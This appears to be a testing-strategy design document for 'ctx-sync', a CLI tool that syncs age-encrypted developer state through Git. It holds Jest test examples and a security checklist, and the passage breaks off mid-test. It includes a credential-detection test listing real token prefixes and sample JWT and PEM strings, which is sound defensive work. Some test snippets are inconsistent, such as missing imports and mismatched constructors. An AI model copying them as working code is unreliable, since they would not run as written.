# Context Sync - Testing Strategy

## Table of Contents

1. [Testing Philosophy](#testing-philosophy)
2. [Development Environment Setup](#development-environment-setup)
3. [Unit Testing](#unit-testing)
4. [Integration Testing](#integration-testing)
5. [End-to-End Testing](#end-to-end-testing)
6. [Manual Testing Checklist](#manual-testing-checklist)
7. [Security Testing](#security-testing)
8. [Performance Testing](#performance-testing)
9. [CI/CD Pipeline](#cicd-pipeline)
10. [Beta Testing Plan](#beta-testing-plan)

---

## Testing Philosophy

### Test Pyramid

```
          /\
         /  \     E2E Tests (10%)
        /----\    - Full user workflows
       /      \   - Multi-machine scenarios
      /--------\  
     / Integration\ (20%)
    /    Tests    \ - Git operations
   /--------------\ - Full state encryption/decryption
  /                \ - File system operations
 /  Security Tests  \ (20%)
/    (Cross-cutting) \ - All attack vectors automated
/--------------------\ - Penetration tests
/                      \ - Fuzzing
/     Unit Tests        \ (50%)
/                        \ - Pure functions
--------------------------  - Validators
                            - Encrypt-by-default logic
```

> **Security tests run at every level** -- unit tests verify individual security functions, integration tests verify encryption workflows end-to-end, and E2E tests verify the full security model across machines.

### Testing Principles

1. **Test in isolation first** - Unit tests catch most bugs
2. **Mock external dependencies** - Don't rely on real Git/GitHub
3. **Use temporary directories** - Never touch real user data
4. **Clean up after tests** - No test pollution
5. **Test edge cases** - Empty files, missing keys, conflicts
6. **Security first** - Verify secrets never leak (in Git, logs, temp files, process lists, shell history)
7. **Encrypt-by-default verification** - Every test that writes state must verify encryption on disk
8. **Command injection prevention** - Every test that restores state must verify command confirmation
9. **No plaintext in artifacts** - CI pipeline scans test output for accidental leaks

---

## Development Environment Setup

### Local Development Setup

```bash
# 1. Clone your project
git clone git@github.com:yourusername/ctx-sync.git
cd ctx-sync

# 2. Install dependencies
npm install

# 3. Install dev dependencies
npm install --save-dev \
  jest \
  @types/jest \
  @types/node \
  mock-fs \
  tmp \
  nock \
  chalk \
  @faker-js/faker

# 4. Setup test directories
mkdir -p test/{unit,integration,e2e,security,fixtures,helpers}

# 5. Create .env.test
cat > .env.test << EOF
CTX_SYNC_TEST_MODE=true
CTX_SYNC_TEST_DIR=/tmp/ctx-sync-test
EOF
```

### Project Structure

```
ctx-sync/
├── src/
│   ├── commands/         # CLI commands
│   ├── core/            # Core logic
│   │   ├── encryption.js       # Age encryption (full state)
│   │   ├── env-handler.js      # Encrypt-by-default, safe-list
│   │   ├── git-sync.js         # Git operations
│   │   ├── state-manager.js    # State read/write (.age files)
│   │   ├── transport.js        # Remote URL validation
│   │   ├── path-validator.js   # Path sanitization
│   │   ├── command-validator.js # Command safety checks
│   │   └── log-sanitizer.js    # Secret redaction in logs
│   ├── utils/           # Utilities
│   └── index.js         # Entry point
├── test/
│   ├── unit/            # Unit tests
│   ├── integration/     # Integration tests
│   ├── e2e/             # End-to-end tests
│   ├── security/        # Security tests (all attack vectors)
│   │   ├── state-encryption.test.js
│   │   ├── secret-leak.test.js
│   │   ├── command-injection.test.js
│   │   ├── cli-args.test.js
│   │   ├── file-permissions.test.js
│   │   ├── transport.test.js
│   │   ├── key-management.test.js
│   │   ├── path-traversal.test.js
│   │   ├── memory-safety.test.js
│   │   ├── merge-conflict.test.js
│   │   └── pentest.test.js
│   ├── fixtures/        # Test data
│   └── helpers/         # Test utilities
├── package.json
└── jest.config.js
```

### Jest Configuration

```javascript
// jest.config.js
module.exports = {
  testEnvironment: 'node',
  coverageDirectory: 'coverage',
  collectCoverageFrom: [
    'src/**/*.js',
    '!src/**/*.test.js'
  ],
  coverageThreshold: {
    global: {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80
    }
  },
  testMatch: [
    '**/test/**/*.test.js'
  ],
  setupFilesAfterEnv: ['<rootDir>/test/setup.js'],
  testTimeout: 10000
};
```

### Test Setup File

```javascript
// test/setup.js
const fs = require('fs-extra');
const path = require('path');
const os = require('os');

// Global test directory
global.TEST_DIR = path.join(os.tmpdir(), 'ctx-sync-test', Date.now().toString());

// Setup before all tests
beforeAll(async () => {
  await fs.ensureDir(global.TEST_DIR);
  process.env.CTX_SYNC_HOME = global.TEST_DIR;
  process.env.CTX_SYNC_TEST_MODE = 'true';
});

// Cleanup after all tests
afterAll(async () => {
  await fs.remove(global.TEST_DIR);
});

// Clean between tests
afterEach(async () => {
  const files = await fs.readdir(global.TEST_DIR);
  for (const file of files) {
    if (file !== '.git') {
      await fs.remove(path.join(global.TEST_DIR, file));
    }
  }
});
```

---

## Unit Testing

### Test Structure

Each module should have corresponding unit tests:

```
src/
  core/
    encryption.js          → test/unit/encryption.test.js
    git-sync.js           → test/unit/git-sync.test.js
    env-handler.js        → test/unit/env-handler.test.js
    state-manager.js      → test/unit/state-manager.test.js
    transport.js          → test/unit/transport.test.js
    path-validator.js     → test/unit/path-validator.test.js
    command-validator.js  → test/unit/command-validator.test.js
    log-sanitizer.js      → test/unit/log-sanitizer.test.js

Security tests (comprehensive, automated):
  test/security/
    state-encryption.test.js     → Full state encryption verification
    secret-leak.test.js          → Secret leak prevention (all channels)
    command-injection.test.js    → Command injection via restore
    cli-args.test.js             → CLI argument safety
    file-permissions.test.js     → Key/config file permissions
    transport.test.js            → Git transport security
    key-management.test.js       → Key rotation, revocation
    path-traversal.test.js       → Path validation & traversal prevention
    memory-safety.test.js        → Secret buffer zeroing
    merge-conflict.test.js       → Encrypted file merge handling
    pentest.test.js              → Automated penetration tests
```

### Example: Encryption Tests

```javascript
// test/unit/encryption.test.js
const { generateKey, encrypt, decrypt } = require('../../src/core/encryption');

describe('Encryption Module', () => {
  let publicKey, privateKey;

  beforeEach(() => {
    // Generate test keys
    const keys = generateKey();
    publicKey = keys.publicKey;
    privateKey = keys.privateKey;
  });

  describe('generateKey()', () => {
    it('should generate valid key pair', () => {
      const keys = generateKey();
      expect(keys.publicKey).toMatch(/^age1[a-z0-9]{58}$/);
      expect(keys.privateKey).toContain('AGE-SECRET-KEY-');
    });

    it('should generate different keys each time', () => {
      const keys1 = generateKey();
      const keys2 = generateKey();
      expect(keys1.publicKey).not.toBe(keys2.publicKey);
    });
  });

  describe('encrypt()', () => {
    it('should encrypt plain text', async () => {
      const plaintext = 'my-secret-value';
      const encrypted = await encrypt(plaintext, publicKey);
      
      expect(encrypted).toContain('-----BEGIN AGE ENCRYPTED FILE-----');
      expect(encrypted).not.toContain(plaintext);
    });

    it('should produce different ciphertext each time', async () => {
      const plaintext = 'my-secret-value';
      const encrypted1 = await encrypt(plaintext, publicKey);
      const encrypted2 = await encrypt(plaintext, publicKey);
      
      expect(encrypted1).not.toBe(encrypted2);
    });

    it('should handle empty strings', async () => {
      const encrypted = await encrypt('', publicKey);
      expect(encrypted).toContain('-----BEGIN AGE ENCRYPTED FILE-----');
    });

    it('should handle special characters', async () => {
      const plaintext = 'password with 🔐 emoji & symbols!@#$%';
      const encrypted = await encrypt(plaintext, publicKey);
      const decrypted = await decrypt(encrypted, privateKey);
      
      expect(decrypted).toBe(plaintext);
    });

    it('should throw error with invalid public key', async () => {
      await expect(encrypt('test', 'invalid-key'))
        .rejects.toThrow();
    });
  });

  describe('decrypt()', () => {
    it('should decrypt encrypted text', async () => {
      const plaintext = 'my-secret-value';
      const encrypted = await encrypt(plaintext, publicKey);
      const decrypted = await decrypt(encrypted, privateKey);
      
      expect(decrypted).toBe(plaintext);
    });

    it('should fail with wrong private key', async () => {
      const plaintext = 'my-secret-value';
      const encrypted = await encrypt(plaintext, publicKey);
      const wrongKey = generateKey().privateKey;
      
      await expect(decrypt(encrypted, wrongKey))
        .rejects.toThrow();
    });

    it('should handle multi-line values', async () => {
      const plaintext = 'line1\nline2\nline3';
      const encrypted = await encrypt(plaintext, publicKey);
      const decrypted = await decrypt(encrypted, privateKey);
      
      expect(decrypted).toBe(plaintext);
    });
  });
});
```

### Example: Encrypt-by-Default & Safe-List Tests

```javascript
// test/unit/env-handler.test.js
const { shouldEncrypt, hasHighEntropy, containsCredentialPattern } = require('../../src/core/env-handler');

describe('Environment Variable Handler (Encrypt-by-Default)', () => {
  describe('shouldEncrypt()', () => {
    it('should encrypt ALL values by default', () => {
      // Everything gets encrypted unless on safe-list
      expect(shouldEncrypt('CUSTOM_VAR', 'any-value')).toBe(true);
      expect(shouldEncrypt('MY_SETTING', 'hello')).toBe(true);
      expect(shouldEncrypt('DATABASE_URL', 'postgres://localhost/db')).toBe(true);
      expect(shouldEncrypt('STRIPE_KEY', 'sk_live_abc123')).toBe(true);
    });

    it('should allow safe-listed keys to be plain', () => {
      // Only these specific keys may be stored plain (with --allow-plain flag)
      expect(shouldEncrypt('NODE_ENV', 'development')).toBe(false);
      expect(shouldEncrypt('PORT', '3000')).toBe(false);
      expect(shouldEncrypt('DEBUG', 'true')).toBe(false);
      expect(shouldEncrypt('LOG_LEVEL', 'info')).toBe(false);
    });

    it('should encrypt safe-listed keys if value looks sensitive', () => {
      // Even safe-listed keys get encrypted if value has high entropy
      expect(shouldEncrypt('PORT', 'sk_live_abc123')).toBe(true);
      expect(shouldEncrypt('NODE_ENV', 'ghp_xxxxxxxxxxxxxxxxxxxx')).toBe(true);
    });
  });

  describe('hasHighEntropy()', () => {
    it('should detect high-entropy strings', () => {
      // Random-looking strings (API keys, tokens)
      expect(hasHighEntropy('a8f3k9d2m5n7p1q4r6s0t8u3v5w7x9y')).toBe(true);
      expect(hasHighEntropy('sk_live_4eC39HqLyjWDarjtT1zdp7dc')).toBe(true);
    });

    it('should not flag low-entropy strings', () => {
      expect(hasHighEntropy('development')).toBe(false);
      expect(hasHighEntropy('true')).toBe(false);
      expect(hasHighEntropy('3000')).toBe(false);
      expect(hasHighEntropy('info')).toBe(false);
    });

    it('should ignore short strings', () => {
      expect(hasHighEntropy('abc')).toBe(false); // Too short to measure
    });
  });

  describe('containsCredentialPattern()', () => {
    it('should detect known service token prefixes', () => {
      expect(containsCredentialPattern('sk_live_abc123')).toBe(true);      // Stripe
      expect(containsCredentialPattern('sk_test_abc123')).toBe(true);      // Stripe test
      expect(containsCredentialPattern('ghp_xxxxxxxxxxxxxxxx')).toBe(true); // GitHub PAT
      expect(containsCredentialPattern('gho_xxxxxxxxxxxxxxxx')).toBe(true); // GitHub OAuth
      expect(containsCredentialPattern('github_pat_xxxx')).toBe(true);     // GitHub fine-grained
      expect(containsCredentialPattern('xoxb-1234-5678')).toBe(true);      // Slack bot
      expect(containsCredentialPattern('xoxp-1234-5678')).toBe(true);      // Slack user
      expect(containsCredentialPattern('AIzaSyA_example')).toBe(true);     // Google
      expect(containsCredentialPattern('AKIAIOSFODNN7')).toBe(true);       // AWS
      expect(containsCredentialPattern('SG.xxxxx')).toBe(true);            // SendGrid
      expect(containsCredentialPattern('sk-xxxxxxxxxxxxxxxxxxxxxxxx')).toBe(true); // OpenAI
    });

    it('should detect JWTs', () => {
      const jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U';
      expect(containsCredentialPattern(jwt)).toBe(true);
    });

    it('should detect PEM private keys', () => {
      expect(containsCredentialPattern('-----BEGIN PRIVATE KEY-----\nMIIEvg...')).toBe(true);
      expect(containsCredentialPattern('-----BEGIN RSA PRIVATE KEY-----\nMIIEow...')).toBe(true);
    });

    it('should detect URLs with embedded credentials', () => {
      expect(containsCredentialPattern('postgres://user:password@localhost:5432/db')).toBe(true);
      expect(containsCredentialPattern('mongodb://admin:secret@cluster0.mongodb.net/db')).toBe(true);
      expect(containsCredentialPattern('redis://:mysecret@redis-server:6379')).toBe(true);
    });

    it('should NOT flag safe values', () => {
      expect(containsCredentialPattern('development')).toBe(false);
      expect(containsCredentialPattern('3000')).toBe(false);
      expect(containsCredentialPattern('true')).toBe(false);
      expect(containsCredentialPattern('https://example.com')).toBe(false); // No credentials
    });
  });
});
```

### Example: Git Operations Tests

```javascript
// test/unit/git-sync.test.js
const mockFs = require('mock-fs');
const { initRepo, commitState, pullState } = require('../../src/core/git-sync');

jest.mock('simple-git');
const simpleGit = require('simple-git');

describe('Git Sync Module', () => {
  let mockGit;

  beforeEach(() => {
    mockGit = {
      init: jest.fn().mockResolvedValue(true),
      add: jest.fn().mockResolvedValue(true),
      commit: jest.fn().mockResolvedValue({ commit: 'abc123' }),
      push: jest.fn().mockResolvedValue(true),
      pull: jest.fn().mockResolvedValue(true),
      status: jest.fn().mockResolvedValue({ files: [] })
    };
    simpleGit.mockReturnValue(mockGit);
  });

  afterEach(() => {
    mockFs.restore();
    jest.clearAllMocks();
  });

  describe('initRepo()', () => {
    it('should initialize git repo', async () => {
      mockFs({
        '/tmp/test': {}
      });

      await initRepo('/tmp/test');
      
      expect(mockGit.init).toHaveBeenCalled();
    });

    it('should not re-initialize existing repo', async () => {
      mockFs({
        '/tmp/test/.git': {}
      });

      await initRepo('/tmp/test');
      
      expect(mockGit.init).not.toHaveBeenCalled();
    });
  });

  describe('commitState()', () => {
    it('should commit state files', async () => {
      const files = ['state.json', 'env-vars.json'];
      
      await commitState('/tmp/test', files, 'Update state');
      
      expect(mockGit.add).toHaveBeenCalledWith(files);
      expect(mockGit.commit).toHaveBeenCalledWith('Update state');
    });

    it('should skip commit if no changes', async () => {
      mockGit.status.mockResolvedValue({ files: [] });
      
      await commitState('/tmp/test', ['state.json'], 'Update');
      
      expect(mockGit.commit).not.toHaveBeenCalled();
    });
  });
});
```

---

## Integration Testing

Integration tests verify multiple components working together.

### Example: Full Encryption Workflow

```javascript
// test/integration/encryption-workflow.test.js
const fs = require('fs-extra');
const path = require('path');
const { 
  generateKey, 
  saveKey, 
  loadKey, 
  encryptState, 
  decryptState 
} = require('../../src/core/encryption');

describe('Encryption Workflow Integration', () => {
  let testDir, keys;

  beforeEach(async () => {
    testDir = path.join(global.TEST_DIR, 'encryption-test');
    await fs.ensureDir(testDir);
    keys = generateKey();
  });

  it('should complete full state encryption workflow', async () => {
    // 1. Save keys to disk (with correct permissions)
    await saveKey(testDir, keys.privateKey);
    
    // Verify permissions
    const keyPath = path.join(testDir, 'key.txt');
    const stats = await fs.stat(keyPath);
    expect(stats.mode & 0o777).toBe(0o600);

    // 2. Load keys from disk
    const loadedKey = await loadKey(testDir);
    expect(loadedKey).toBe(keys.privateKey);

    // 3. Encrypt entire state (not individual values)
    const state = {
      'my-app': {
        STRIPE_KEY: { value: 'sk_live_abc123' },
        NODE_ENV: { value: 'development' }
      }
    };
    
    const encrypted = await encryptState(state, keys.publicKey);
    
    // Encrypted result is a single blob
    expect(encrypted).toContain('-----BEGIN AGE ENCRYPTED FILE-----');
    expect(encrypted).not.toContain('sk_live_abc123');
    expect(encrypted).not.toContain('development');
    expect(encrypted).not.toContain('my-app');

    // 4. Decrypt entire state
    const decrypted = await decryptState(encrypted, keys.privateKey);
    
    expect(decrypted['my-app'].STRIPE_KEY.value).toBe('sk_live_abc123');
    expect(decrypted['my-app'].NODE_ENV.value).toBe('development');
  });

  it('should fail gracefully with wrong key', async () => {
    const state = { SECRET: { value: 'test' } };
    const encrypted = await encryptState(state, keys.publicKey);
    
    const wrongKey = generateKey().privateKey;
    
    await expect(decryptState(encrypted, wrongKey))
      .rejects.toThrow();
  });

  it('should encrypt all state file types', async () => {
    const stateFiles = {
      'state': { projects: [{ name: 'test', path: '~/projects/test' }] },
      'env-vars': { 'test': { KEY: { value: 'val' } } },
      'docker-state': { 'test': { services: [] } },
      'mental-context': { 'test': { currentTask: 'Testing' } },
      'services': { 'test': { services: [] } },
      'directories': { recentDirs: [] }
    };

    for (const [name, data] of Object.entries(stateFiles)) {
      const encrypted = await encryptState(data, keys.publicKey);
      expect(encrypted).toContain('AGE ENCRYPTED');
      
      // Write to .age file
      const agePath = path.join(testDir, `${name}.age`);
      await fs.writeFile(agePath, encrypted);
      
      // Verify no plaintext on disk
      const onDisk = await fs.readFile(agePath, 'utf-8');
      expect(onDisk).not.toContain(JSON.stringify(data));
    }
  });
});
```

### Example: Git + Encryption Integration

```javascript
// test/integration/sync-workflow.test.js
const fs = require('fs-extra');
const path = require('path');
const { syncState } = require('../../src/core/sync');

describe('Sync Workflow Integration', () => {
  let machineA, machineB, remoteRepo;

  beforeEach(async () => {
    // Setup three directories: two machines + remote repo
    machineA = path.join(global.TEST_DIR, 'machine-a');
    machineB = path.join(global.TEST_DIR, 'machine-b');
    remoteRepo = path.join(global.TEST_DIR, 'remote');

    await fs.ensureDir(machineA);
    await fs.ensureDir(machineB);
    await fs.ensureDir(remoteRepo);

    // Initialize bare remote repo
    await execSync(`cd ${remoteRepo} && git init --bare`);
  });

  it('should sync state from Machine A to Machine B', async () => {
    // Machine A: Create and sync state
    const stateA = {
      projects: [{
        name: 'my-app',
        branch: 'main'
      }]
    };

    await syncState(machineA, stateA, remoteRepo);

    // Machine B: Pull state
    const stateB = await syncState(machineB, null, remoteRepo);

    expect(stateB.projects[0].name).toBe('my-app');
  });
});
```

---

## End-to-End Testing

E2E tests simulate real user workflows.

### Test Environment Setup

```javascript
// test/e2e/helpers/test-env.js
const { execSync } = require('child_process');
const fs = require('fs-extra');
const path = require('path');

class TestEnvironment {
  constructor() {
    this.homeDir = path.join(global.TEST_DIR, 'home');
    this.projectDir = path.join(this.homeDir, 'projects', 'test-app');
  }

  async setup() {
    // Create home directory structure
    await fs.ensureDir(this.homeDir);
    await fs.ensureDir(this.projectDir);

    // Create test project
    await fs.writeFile(
      path.join(this.projectDir, '.env'),
      'NODE_ENV=development\nSTRIPE_KEY=sk_test_123'
    );

    // Initialize git repo
    execSync('git init', { cwd: this.projectDir });
    execSync('git config user.email "test@test.com"', { cwd: this.projectDir });
    execSync('git config user.name "Test User"', { cwd: this.projectDir });
  }

  async cleanup() {
    await fs.remove(this.homeDir);
  }

  execCommand(cmd) {
    return execSync(`node ${__dirname}/../../../src/index.js ${cmd}`, {
      cwd: this.projectDir,
      env: { ...process.env, CTX_SYNC_HOME: this.homeDir },
      encoding: 'utf-8'
    });
  }
}

module.exports = TestEnvironment;
```

### Example: Full User Workflow

```javascript
// test/e2e/user-workflow.test.js
const TestEnvironment = require('./helpers/test-env');

describe('E2E: Complete User Workflow', () => {
  let env;

  beforeEach(async () => {
    env = new TestEnvironment();
    await env.setup();
  });

  afterEach(async () => {
    await env.cleanup();
  });

  it('should complete first-time setup with security checks', async () => {
    // Run init command
    const output = env.execCommand('init --no-interactive');
    
    expect(output).toContain('Encryption key generated');
    expect(output).toContain('Permissions: 600');
    expect(output).toContain('All set!');

    // Verify key file exists with correct permissions
    const keyFile = path.join(env.homeDir, '.config', 'ctx-sync', 'key.txt');
    expect(await fs.pathExists(keyFile)).toBe(true);
    const stats = await fs.stat(keyFile);
    expect(stats.mode & 0o777).toBe(0o600);

    // Verify config directory permissions
    const configDir = path.join(env.homeDir, '.config', 'ctx-sync');
    const dirStats = await fs.stat(configDir);
    expect(dirStats.mode & 0o777).toBe(0o700);
  });

  it('should track a project with encrypted state', async () => {
    env.execCommand('init --no-interactive');

    const output = env.execCommand('track');
    
    expect(output).toContain('Tracking: test-app');
    expect(output).toContain('Found .env file');

    // Verify state file is ENCRYPTED (not plaintext JSON)
    const stateFile = path.join(env.homeDir, '.context-sync', 'state.age');
    expect(await fs.pathExists(stateFile)).toBe(true);
    
    const raw = await fs.readFile(stateFile, 'utf-8');
    expect(raw).toContain('-----BEGIN AGE ENCRYPTED FILE-----');
    expect(raw).not.toContain('test-app'); // Name should be encrypted

    // Verify NO plaintext state.json exists
    const plaintextFile = path.join(env.homeDir, '.context-sync', 'state.json');
    expect(await fs.pathExists(plaintextFile)).toBe(false);
  });

  it('should import environment variables (all encrypted by default)', async () => {
    env.execCommand('init --no-interactive');
    
    const output = env.execCommand('env import .env');
    
    expect(output).toContain('Imported 2 env vars');
    expect(output).toContain('all encrypted');

    // Verify the file on disk is a single encrypted blob
    const envFile = path.join(env.homeDir, '.context-sync', 'env-vars.age');
    const raw = await fs.readFile(envFile, 'utf-8');
    
    expect(raw).toContain('-----BEGIN AGE ENCRYPTED FILE-----');
    expect(raw).not.toContain('sk_test_123');     // Secret not in plaintext
    expect(raw).not.toContain('development');      // Even "safe" values encrypted
    expect(raw).not.toContain('NODE_ENV');          // Key names encrypted too

    // Verify NO plaintext env-vars.json exists
    expect(await fs.pathExists(
      path.join(env.homeDir, '.context-sync', 'env-vars.json')
    )).toBe(false);
  });

  it('should sync to Git with only encrypted files', async () => {
    env.execCommand('init --no-interactive');
    env.execCommand('track');
    
    const output = env.execCommand('sync');
    
    expect(output).toContain('Synced');
    
    // Verify git commits contain only .age files + manifest.json
    const gitFiles = execSync('git ls-files', {
      cwd: path.join(env.homeDir, '.context-sync'),
      encoding: 'utf-8'
    });
    
    const files = gitFiles.trim().split('\n');
    for (const file of files) {
      expect(file.endsWith('.age') || file === 'manifest.json').toBe(true);
    }

    // Verify Git history has no plaintext
    const gitLog = execSync('git log -p', {
      cwd: path.join(env.homeDir, '.context-sync'),
      encoding: 'utf-8'
    });
    
    expect(gitLog).not.toContain('sk_test_123');
    expect(gitLog).not.toContain('test-app');
  });

  it('should reject env values passed as CLI arguments', async () => {
    env.execCommand('init --no-interactive');

    // This should FAIL -- values not allowed as CLI args
    expect(() => {
      env.execCommand('env add STRIPE_KEY=sk_live_123');
    }).toThrow();
  });
});
```

### Multi-Machine E2E Test

```javascript
// test/e2e/multi-machine.test.js
describe('E2E: Multi-Machine Sync', () => {
  let machineA, machineB, remoteRepo;

  beforeEach(async () => {
    machineA = new TestEnvironment('machine-a');
    machineB = new TestEnvironment('machine-b');
    
    await machineA.setup();
    await machineB.setup();
    
    // Setup shared remote repo (local bare repo simulating GitHub)
    remoteRepo = path.join(global.TEST_DIR, 'remote.git');
    await fs.ensureDir(remoteRepo);
    execSync('git init --bare', { cwd: remoteRepo });
  });

  it('should sync encrypted context from Machine A to Machine B', async () => {
    // Machine A: Setup and track
    machineA.execCommand('init --no-interactive');
    const keys = await machineA.getKeys();
    
    machineA.execCommand('track');
    machineA.execCommand(`sync --remote ${remoteRepo}`);

    // Verify remote repo only contains encrypted files
    const remoteFiles = execSync('git ls-tree --name-only HEAD', {
      cwd: remoteRepo,
      encoding: 'utf-8'
    });
    for (const file of remoteFiles.trim().split('\n')) {
      expect(file.endsWith('.age') || file === 'manifest.json').toBe(true);
    }

    // Machine B: Restore with same key
    await machineB.setKeys(keys);
    machineB.execCommand(`init --restore --remote ${remoteRepo}`);
    
    const output = machineB.execCommand('list');
    
    expect(output).toContain('test-app');
  });

  it('should decrypt all state on Machine B', async () => {
    // Machine A: Add encrypted secret via stdin
    machineA.execCommand('init --no-interactive');
    const keys = await machineA.getKeys();
    
    machineA.execCommand('env add SECRET_KEY --stdin', {
      stdin: 'my-secret-value'
    });
    machineA.execCommand(`sync --remote ${remoteRepo}`);

    // Machine B: Restore and verify
    await machineB.setKeys(keys);
    machineB.execCommand(`init --restore --remote ${remoteRepo}`);
    
    const envVars = await machineB.getEnvVars('test-app');
    
    expect(envVars.SECRET_KEY).toBe('my-secret-value');
  });

  it('should require command confirmation on restore', async () => {
    // Machine A: Track with services
    machineA.execCommand('init --no-interactive');
    const keys = await machineA.getKeys();

    machineA.execCommand('track --with-services');
    machineA.execCommand(`sync --remote ${remoteRepo}`);

    // Machine B: Restore -- should show commands for approval
    await machineB.setKeys(keys);
    machineB.execCommand(`init --restore --remote ${remoteRepo}`);

    const output = machineB.execCommand('restore test-app --no-interactive');

    // Should show commands but NOT execute them (non-interactive mode skips execution)
    expect(output).toContain('The following commands will be executed');
    expect(output).toContain('Skipped (non-interactive mode)');
  });

  it('should fail to decrypt with wrong key on Machine B', async () => {
    machineA.execCommand('init --no-interactive');
    machineA.execCommand('track');
    machineA.execCommand(`sync --remote ${remoteRepo}`);

    // Machine B: Try with different key (should fail)
    const wrongKeys = generateKey();
    await machineB.setKeys(wrongKeys);

    expect(() => {
      machineB.execCommand(`init --restore --remote ${remoteRepo}`);
    }).toThrow(); // Decryption failure
  });
});
```

### E2E: Key Rotation Workflow

```javascript
// test/e2e/key-rotation.test.js
describe('E2E: Key Rotation', () => {
  let machineA, machineB, remoteRepo;

  beforeEach(async () => {
    machineA = new TestEnvironment('machine-a');
    machineB = new TestEnvironment('machine-b');
    remoteRepo = path.join(global.TEST_DIR, 'remote.git');
    await fs.ensureDir(remoteRepo);
    execSync('git init --bare', { cwd: remoteRepo });
  });

  it('should rotate key and re-encrypt all state', async () => {
    // Setup
    machineA.execCommand('init --no-interactive');
    const oldKeys = await machineA.getKeys();
    machineA.execCommand('env add SECRET --stdin', { stdin: 'my-value' });
    machineA.execCommand(`sync --remote ${remoteRepo}`);

    // Rotate
    machineA.execCommand('key rotate --no-interactive');
    const newKeys = await machineA.getKeys();

    expect(newKeys.publicKey).not.toBe(oldKeys.publicKey);

    // Sync rotated state
    machineA.execCommand(`sync --remote ${remoteRepo}`);

    // Machine B with NEW key should work
    await machineB.setKeys(newKeys);
    machineB.execCommand(`init --restore --remote ${remoteRepo}`);
    const envVars = await machineB.getEnvVars('test-app');
    expect(envVars.SECRET).toBe('my-value');

    // Machine B with OLD key should FAIL
    const machineC = new TestEnvironment('machine-c');
    await machineC.setup();
    await machineC.setKeys(oldKeys);

    expect(() => {
      machineC.execCommand(`init --restore --remote ${remoteRepo}`);
    }).toThrow();
  });
});
```

---

## Manual Testing Checklist

### Initial Setup

- [ ] `npm install -g ctx-sync` works
- [ ] `ctx-sync --version` shows version
- [ ] `ctx-sync --help` shows commands
- [ ] `ctx-sync init` creates config directory
- [ ] Encryption key is generated
- [ ] Key file permissions are 600
- [ ] Config directory permissions are 700
- [ ] Key backup prompts work (no QR code option)
- [ ] Clipboard backup auto-clears after 30 seconds
- [ ] Git repo is initialized
- [ ] Remote URL is validated (SSH or HTTPS only)
- [ ] HTTP remote is rejected with clear error

### Project Tracking

- [ ] `ctx-sync track` detects current project
- [ ] Detects Git repository
- [ ] Detects .env files
- [ ] Prompts for env import
- [ ] Creates encrypted `state.age` (not plaintext JSON)
- [ ] Handles projects without Git
- [ ] Handles projects without .env
- [ ] Project paths are validated (within HOME directory)
- [ ] Path traversal attempts are rejected

### Environment Variables

- [ ] Import from .env file works
- [ ] **ALL env vars are encrypted by default** (encrypt-by-default)
- [ ] Safe-list vars can be stored plain only with `--allow-plain`
- [ ] Handles multi-line values
- [ ] Handles special characters
- [ ] Interactive add uses hidden input (not visible on screen)
- [ ] `ctx-sync env add KEY=value` is rejected (no values in CLI args)
- [ ] `ctx-sync env add KEY` prompts for value interactively
- [ ] `ctx-sync env add KEY --stdin` reads from pipe
- [ ] Scan environment works
- [ ] No env var values appear in shell history after import
- [ ] No env var values appear in `ps aux` during operation

### Docker Integration

- [ ] Detects docker-compose.yml
- [ ] Tracks running containers
- [ ] Records port mappings
- [ ] **Auto-start requires explicit user confirmation on restore**
- [ ] Docker image names are displayed for review before pulling
- [ ] Handles missing Docker gracefully

### Syncing

- [ ] First sync creates Git commit
- [ ] All committed files are `.age` (encrypted) except `manifest.json`
- [ ] `manifest.json` contains only version and timestamps
- [ ] Push to remote works
- [ ] Pull from remote works
- [ ] **Remote URL validated on every sync** (SSH/HTTPS enforced)
- [ ] Handles merge conflicts (encrypted files never auto-merged)
- [ ] Shows sync status
- [ ] Works offline (local only)

### Restoration

- [ ] Restore on new machine works
- [ ] Key restoration flow works
- [ ] Key file permissions set to 600 on restore
- [ ] All env vars decrypt correctly
- [ ] **All commands shown for explicit approval before execution**
- [ ] User can approve all, skip all, or choose individually
- [ ] Suspicious commands are flagged with warnings
- [ ] Terminal opens in correct directory
- [ ] Git branch is correct

### Mental Context

- [ ] Add task notes
- [ ] Track blockers
- [ ] Add next steps
- [ ] Save breadcrumbs
- [ ] Display on restore
- [ ] Mental context is encrypted in `mental-context.age`
- [ ] No plaintext mental context on disk or in Git

### Key Management

- [ ] `ctx-sync key show` displays public key only
- [ ] `ctx-sync key rotate` generates new key and re-encrypts all state
- [ ] Old key cannot decrypt files after rotation
- [ ] Git history is rewritten on rotation
- [ ] `ctx-sync key verify` checks permissions and integrity
- [ ] `ctx-sync key update` restores rotated key on other machines
- [ ] Team key revocation re-encrypts shared state

### Security Audit

- [ ] `ctx-sync audit` checks key file permissions
- [ ] `ctx-sync audit` checks remote transport security
- [ ] `ctx-sync audit` scans Git history for plaintext leaks
- [ ] `ctx-sync audit` reports repo size
- [ ] `ctx-sync audit` verifies all state files are encrypted

### Edge Cases

- [ ] Empty .env file
- [ ] Missing Git config
- [ ] No internet connection
- [ ] Corrupted encrypted state file (should fail gracefully)
- [ ] Tampered encrypted state file (decryption should fail)
- [ ] Wrong encryption key
- [ ] Disk full
- [ ] Permission errors
- [ ] Key file with wrong permissions (should refuse to load)
- [ ] HTTP remote URL (should be rejected)
- [ ] Malicious commands in restored services (should require confirmation)
- [ ] Path traversal in project paths (should be rejected)
- [ ] Binary data in .env file (should handle gracefully)
- [ ] Very long env var values (should handle gracefully)
- [ ] Null bytes in input (should handle gracefully)

---

## Security Testing

Security testing covers all attack vectors identified in the threat model. These tests are **automated** and run as part of CI/CD.

### 1. Full State Encryption Tests

```javascript
// test/security/state-encryption.test.js
describe('Security: Full State Encryption', () => {
  it('should encrypt ALL state files before writing to disk', async () => {
    await trackProject('my-app');
    await sync();

    // Check every file on disk
    const stateDir = path.join(global.TEST_DIR, '.context-sync');
    const files = await fs.readdir(stateDir);

    const ageFiles = files.filter(f => f.endsWith('.age'));
    const jsonFiles = files.filter(f => f.endsWith('.json'));

    // Only manifest.json should be plaintext
    expect(jsonFiles).toEqual(['manifest.json']);

    // All state files should be .age (encrypted)
    expect(ageFiles).toContain('state.age');
    expect(ageFiles).toContain('env-vars.age');
    expect(ageFiles).toContain('docker-state.age');
